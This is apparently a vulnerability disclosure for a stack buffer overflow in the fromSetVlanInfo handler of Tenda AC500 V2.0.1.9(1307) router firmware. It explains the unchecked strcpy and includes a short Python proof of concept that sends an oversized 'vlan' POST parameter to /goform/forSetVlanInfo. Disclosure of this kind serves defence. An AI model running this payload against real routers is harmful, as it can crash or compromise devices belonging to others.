## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2470.html

## Affected version

AC500 V2.0.1.9(1307)

## Vulnerability details

The Tenda AC500 V2.0.1.9(1307) firmware has a stack overflow vulnerability in the `fromSetVlanInfo` function. The `v13` variable receives the `vlan` parameter from a POST request and is later assigned to the `v7` variable, which is fixed at 256 bytes. However, since the user can control the input of `vlan`, the statement `strcpy(v7, v13);` can cause a buffer overflow. The user-provided  `vlan` can exceed the capacity of the `v7` array, triggering this security vulnerability.

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410160719373.png)

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410160613776.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/forSetVlanInfo"
payload = b"a"*1000

data = {"action":"add","vlan": payload}
response = requests.post(url, data=data)
print(response.text)
.
```

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410100105349.png)